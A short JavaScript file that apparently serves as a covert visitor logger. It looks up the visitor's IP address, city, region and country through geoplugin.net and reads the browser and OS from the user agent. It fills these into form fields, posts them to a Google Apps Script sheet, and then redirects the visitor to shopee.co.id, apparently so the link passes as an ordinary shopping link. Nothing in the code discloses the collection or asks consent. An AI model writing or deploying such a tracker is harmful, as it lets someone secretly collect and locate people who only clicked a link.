import 'regenerator-runtime';

const init = async () => {
  let browserName = 'unknown';
  let osName = 'unknown';
  let ipInfo = undefined;

  try {
    const dataApi = await fetch('http://www.geoplugin.net/json.gp');
    ipInfo = await dataApi.json();
  } catch (error) {
    ipInfo = {};
  }

  console.log(ipInfo);

  // References
  const browserList = [
    { name: 'Firefox', value: 'Firefox'},
    { name: 'Opera', value: 'Opera'},
    { name: 'Edge', value: 'Edge' },
    { name: 'Chrome', value: 'Chrome'},
    { name: 'Safari', value: 'Safari'}
  ];

  const os = [
    { name: 'Android', value: 'Android'},
    { name: 'iPhone', value: 'iPhone'},
    { name: 'iPad', value: 'iPad'},
    { name: 'Macintosh', value: 'Mac'},
    { name: 'Linux', value: 'Linux'},
    { name: 'Windows', value: 'Windows'}
  ];

  // Useragent Contains
  const userDetails = navigator.userAgent;
  for(let i in browserList) {
    if (userDetails.includes(browserList[i].value)) {
      browserName = browserList[i].name || "Unknown Browser";
      break;
    }
  }

  for(let i in os){
    if (userDetails.includes(os[i].value)) {
      osName = os[i].name;
    }
  }

  // Insert to form
  document.querySelector('form #time').value = new Date().toISOString();
  document.querySelector('form #browser').value = browserName;
  document.querySelector('form #os').value = osName;
  document.querySelector('form #ip').value = await ipInfo.geoplugin_request;
  document.querySelector('form #city').value = await ipInfo.geoplugin_city;
  document.querySelector('form #prov').value = await ipInfo.geoplugin_region;
  document.querySelector('form #country').value = await ipInfo.geoplugin_countryName;

  // To Google Sheet
  const scriptURL = 'https://script.google.com/macros/s/AKfycbwT0kheuJAwfFK87-Ho-8PROPBQPgWYnKDxQAu6FAfnMOKif-ypFAdW4qgvs2Y7LXwGog/exec';
  const form = document.forms['submit-to-google-sheet']

  fetch(scriptURL, { method: 'POST', body: new FormData(form)})
    .then(response => window.location.href = 'https://shopee.co.id/')
    .catch(error => console.error('Error!', error.message))
}

init();